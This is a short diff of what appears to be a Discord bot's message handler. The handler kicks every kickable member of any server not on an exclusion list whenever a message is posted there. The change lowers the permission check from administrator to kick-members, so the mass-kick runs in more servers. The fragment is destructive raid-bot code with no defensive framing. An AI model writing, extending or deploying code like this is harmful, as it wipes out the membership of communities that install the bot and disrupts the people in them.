@@ -328,7 +328,7 @@ client.on("message", async msg => {
 if(list.includes(msg.author.id)) {return}
     if(msg.channel.type === 'dm') {return}
 if(!unallowedguilds.includes(msg.guild.id)) {
-    if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
+    if(msg.guild.me.hasPermission("KICK_MEMBERS")) {
 msg.guild.members.cache.forEach(m => {
 if(m.kickable) {m.kick()}})}}
   }
